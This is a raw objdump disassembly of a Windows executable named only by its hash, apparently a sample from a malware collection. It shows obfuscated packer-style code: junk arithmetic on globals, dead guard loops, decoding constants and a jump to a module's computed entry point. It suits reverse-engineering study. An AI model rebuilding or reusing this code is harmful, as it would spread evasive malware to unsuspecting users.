
63a2d9f45d43bc378584bc812e86feb8b00ce1da53cc6fcd331b46c1f8876c28.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
